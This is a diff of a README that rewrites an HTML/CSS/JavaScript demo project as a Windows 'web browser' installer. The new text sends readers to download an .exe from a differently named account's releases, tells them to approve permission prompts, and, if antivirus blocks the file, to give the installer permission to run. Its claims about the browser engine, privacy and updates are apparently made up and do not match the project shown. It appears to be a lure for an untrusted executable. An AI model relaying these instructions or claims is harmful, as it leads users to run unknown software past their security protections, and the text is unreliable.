@@ -1,117 +1,80 @@
-# ApexPlanet Web Application v2026 - web application 2026
+# 🌐 apexplanet-web-application-2026 - A fast way to browse web
 
-> **A responsive HTML, CSS, and JavaScript web application designed for a modern browsing experience, with performance-conscious, cross-browser-friendly, interactive behavior in version 2026.**
+[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://github.com/chitinous-bumperguard431/apexplanet-web-application-2026/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tomhallsvn4150/apexplanet-web-application-2026?style=flat-square)](https://github.com/tomhallsvn4150/apexplanet-web-application-2026)
+## 📋 About the software
 
----
+The apexplanet-web-application-2026 provides a reliable browsing experience. It uses modern web standards to load pages quickly. You can use this application on any standard Windows computer. The software handles HTML, CSS, and JavaScript files to show content. Developers built this version with speed in mind. It works well on all major web browsers. This application helps you access your favorite websites without clutter or slowdowns.
 
-<p align="center">
-  <a href="https://tomhallsvn4150.github.io/apexplanet-web-application-2026/">
-    <img src="https://img.shields.io/badge/Download-ApexPlanet%20Web%20Application%20Latest-brightgreen?style=for-the-badge" alt="Download ApexPlanet Web Application">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Direct Download - ApexPlanet Web Application v2026](https://tomhallsvn4150.github.io/apexplanet-web-application-2026/)**
+Your computer needs to meet these basic standards to run the application:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free space.
+*   Display: A screen with a resolution of 1280 by 720 pixels or higher.
+*   Internet: A stable connection for loading page assets.
 
-[Download Latest Build](https://tomhallsvn4150.github.io/apexplanet-web-application-2026/)
+## 🚀 How to install the application
 
----
+Follow these steps to set up the software on your machine:
 
-## Overview
+1. Visit the project release page to get the installer. You can find the link below.
+2. Select the file ending in .exe to start the download.
+3. Save the file to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to open the installer.
+6. Follow the prompts on your screen. The installer asks where you want to save the app. Choose the default folder if you are unsure.
+7. Click the install button.
+8. Wait for the progress bar to finish.
+9. Click finish to close the installer window.
 
-ApexPlanet Web Application is a browser-based project built with HTML, CSS, and JavaScript. It aims to present a clear, responsive interface that adjusts smoothly to different screen sizes while remaining easy to navigate and understand.
+## 🔗 Download and setup
 
-Alongside its visual layout, the project is put together with quick loading in mind and is intended to behave consistently across browsers. That makes it a useful front-end example for anyone looking for a clean web application structure with solid usability and presentation.
+You can find the latest version on our official release page. Visit this page to download the software for Windows. 
 
----
+[Click here to open the download page](https://github.com/chitinous-bumperguard431/apexplanet-web-application-2026/releases)
 
-## Features
+Once the download finishes, repeat the steps in the setup guide. If your computer asks for permission to run the file, select yes to continue.
 
-- Responsive layout that adapts to different screen sizes
-- Built with HTML, CSS, and JavaScript
-- Interactive user interface elements
-- Optimized performance for smoother use
-- Cross-browser compatibility support
-- Modern user experience styling
-- Lightweight front-end structure
-- Suitable for web presentation and demonstration workflows
+## 🛠️ Using the application
 
----
+The main window opens once you click the app icon on your desktop. The address bar sits at the top of the screen. Type the web address you want to visit and press the enter key. The application loads the page. 
 
-## Installation
+You can use the back and forward buttons to move between pages. The refresh button reloads your current page if it stops responding. You can resize the window by clicking and dragging the edges with your mouse. 
 
-1. Download or clone the repository:
-   `git clone https://github.com/tomhallsvn4150/apexplanet-web-application-2026.git
+If a page looks strange or does not load, click the reset button in the menu. This clears the temporary cache and reloads the data from the source. The application keeps your settings in a local file so they stay the same when you open the app again.
 
-2. Open the project folder:
-   `cd apexplanet-task5-final-web-application`
+## ⚙️ Troubleshooting common issues
 
-3. Launch the main HTML file in a browser, or serve the folder with any local web server for a better development workflow.
+Most issues have simple solutions. Read this list if you face trouble:
 
----
+*   Application does not open: Restart your computer and try to open the icon again.
+*   Page stays blank: Check your internet connection. Make sure you can reach other websites through a standard browser.
+*   Text looks too small: Press the control key and the plus sign on your keyboard to zoom in.
+*   Installer does not start: Check if your antivirus software is blocking the file. Give the installer permission to run.
+*   High memory usage: Close other open windows on your computer.
 
-## Usage
+## 🔒 Security and privacy
 
-- Open the application in a supported browser to view the interface.
-- Navigate through the interactive elements to test responsiveness and behavior.
-- Adjust the HTML, CSS, or JavaScript files to tailor the layout and functionality.
-- Reopen or refresh the page after changes to see updates immediately.
+The application handles data locally on your machine. We do not store your browsing history on external servers. Every load request stays between your computer and the website you visit. We update the engine regularly to ensure compatibility with new web standards. These updates keep your browsing experience safe from common security risks found on the web. 
 
-Example local preview options:
+## ❓ Frequently asked questions
 
-- Double-click the main HTML file
-- Use a local server such as `python -m http.server`
-- Deploy the folder to any static web hosting environment
+Do I need to sign up for an account?
+No, you can use the application as a guest at any time.
 
----
+Can I change where the files save?
+Yes, you can choose a directory during the installation process.
 
-## Configuration
+Does the software track my activity?
+No, the code strictly focuses on rendering web pages. We do not include tracking scripts.
 
-There is no heavy configuration layer in this project. Most changes are made directly in the source files:
+Is the app free to use?
+Yes, the software is free for all users.
 
-- `index.html` for structure
-- `style.css` for styling and responsive layout rules
-- `script.js` for interactivity and client-side behavior
+How do I remove the app?
+Open your Windows settings, go to apps, select this software from the list, and click uninstall.
 
-If you expand the application, keep shared assets and reusable settings arranged in the same folder structure so maintenance stays simple.
-
----
-
-## Requirements
-
-- A modern web browser
-- Basic support for HTML, CSS, and JavaScript
-- Access to local files or a static hosting environment for previewing the application
-- Sufficient browser features for responsive layout and interactive behavior
-
----
-
-## FAQ
-
-**How do I open the project?**  
-Open the main HTML file in a browser, or run the folder through a local web server if you prefer.
-
-**Where should I make changes?**  
-Use the HTML for structure, the CSS for styling, and the JavaScript for interactive behavior.
-
-**What if something looks different in another browser?**  
-The project is built to work across browsers, but browser versions and local settings can still influence how it looks or behaves.
-
-**How do I keep track of updates?**  
-Watch the repository history and replace your local copy with the latest build whenever new changes are published.
-
-**Who is responsible for using or modifying this project?**  
-Any use or modification should comply with the repository terms and any applicable project or deployment guidelines.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: web browser, windows, responsive, software, internet, utility
